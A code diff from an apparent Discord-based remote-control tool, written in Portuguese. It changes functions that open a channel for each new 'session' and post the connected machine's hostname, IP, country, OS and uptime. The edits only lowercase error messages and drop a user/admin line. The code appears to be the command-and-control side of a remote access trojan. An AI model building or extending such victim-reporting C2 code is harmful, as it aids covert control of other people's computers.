@@ -14,7 +14,7 @@ async def create_session(client, guild_id, session_prefix):
     try:
         guild = discord.utils.get(client.guilds, id=guild_id)
         if not guild:
-            print(f"[!] Erro: Não foi possível encontrar o servidor com ID {guild_id}")
+            print(f"[!] erro: não foi possível encontrar o servidor com ID {guild_id}")
             return None
             
         next_number = get_next_channel_number(guild, session_prefix)
@@ -31,7 +31,7 @@ async def create_session(client, guild_id, session_prefix):
         return channel
         
     except Exception as e:
-        print(f"[!] Erro ao criar sessão: {str(e)}")
+        print(f"[!] erro ao criar sessão: {str(e)}")
         return None
 
 def get_next_channel_number(guild, session_prefix):
@@ -61,11 +61,10 @@ async def send_session_info(client, channel):
         msg = (
             f"@here :white_check_mark: Nova sessão iniciada `{channel.name}` | "
             f"{os_info} | Hostname: `{hostname}` | {ip} :flag_{flag.lower()}: | "
-            f"Usuário: `{user}`{admin_icon} | "
             f"Tempo online: <t:{int(time.time())}:R>"
         )
         
         await channel.send(msg)
         
     except Exception as e:
-        print(f"[!] Erro ao enviar informações de sessão: {str(e)}")
+        print(f"[!] erro ao enviar informações de sessão: {str(e)}")
